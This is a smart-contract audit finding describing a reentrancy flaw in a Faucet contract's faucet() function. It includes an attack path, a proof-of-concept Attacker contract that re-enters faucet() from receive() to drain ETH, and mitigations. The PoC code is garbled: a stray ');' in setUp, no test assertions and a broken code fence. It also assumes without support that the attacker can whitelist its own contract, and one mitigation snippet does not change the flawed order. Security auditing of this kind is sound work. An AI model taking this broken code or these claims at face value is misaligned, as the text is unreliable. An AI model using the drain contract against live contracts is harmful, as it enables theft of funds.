# An attacker can drain ETH from the Faucet contract due to a reentrancy vulnerability.

### Summary

A missing reentrancy guard in the `faucet()` function will cause a complete loss of ETH in the contract for the protocol as an attacker will exploit recursive calls via a malicious contract.

### Root Cause

In `Faucet.sol:70`, the faucet function sends ETH to a user-controlled address without implementing reentrancy protection ([Lines 70-74](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Faucet.sol#L70)), enabling recursive calls through the attacker's malicious contract:

```solidity
if (amountEth > 0) {
    (bool success,) = payable(user).call{value: amountEth}("");  // Vulnerable ETH transfer
    require(success, "Faucet: ETH transfer failed");
}
```

### Internal Pre-conditions

- The attacker must call `addToWhitelist()` to add their malicious contract to the whitelist.
- The Faucet contract must hold a non-zero ETH balance.


### External Pre-conditions

- Gas limits must be high enough to allow multiple recursive calls.
- The attacker must deploy a malicious contract with a receive() function that re-enters the faucet() function.

### Attack Path

1. Attacker deploys malicious contract with a `receive()` function that calls `faucet()`
2. Attacker whitelists their contract through `addToWhitelist`
3. Attacker calls `faucet(0, 0, 0, 1 ether, address(this))` on their contract
4. During ETH transfer, malicious contract's receive() re-enters faucet()
5. Process repeats recursively until:
    - Faucet ETH balance is fully drained, or
    - Transaction reaches gas limits

### Impact

The Faucet contract suffers complete loss of its ETH balance (up to 100% of funds). The attacker gains all drained ETH with minimal cost (only gas for initial transaction).

contract FaucetTest is Test {
    Faucet faucet;
    Attacker attacker;

    function setUp() public {
        // Deploy contracts
        faucet = new Faucet(address(0), address(0), address(0));
        attacker = new Attacker(faucet);

        );
    }
}

contract Attacker {
    Faucet public immutable target;
    uint256 public count;
    
    constructor(Faucet _target) {
        target = _target;
    }
    
    function attack() external {
        target.faucet(0, 0, 0, 1 ether, address(this));
    }
    
    receive() external payable {
        if (count < 3) {  // Will reenter 3 times
            count++;
            target.faucet(0, 0, 0, 1 ether, address(this));
        }
    }
}
```

### Mitigation

1. Add a Reentrancy Guard: Use a nonReentrant modifier to prevent recursive calls:
```solidity
bool private locked;

modifier nonReentrant() {
    require(!locked, "Reentrant call");
    locked = true;
    _;
    locked = false;
}

function faucet(...) public nonReentrant {
    // existing code
}
```


2. Follow the Checks-Effects-Interactions Pattern: Ensure state changes are made before external calls:
```solidity
function faucet(...) public {
    require(...);
    // Perform all state updates here
    if (amountEth > 0) {
        (bool success, ) = payable(user).call{value: amountEth}("");
        require(success, "ETH transfer failed");
    }
}
```

3. Use OpenZeppelin’s ReentrancyGuard: Replace the custom reentrancy guard with OpenZeppelin’s battle-tested implementation for simplicity and reliability.
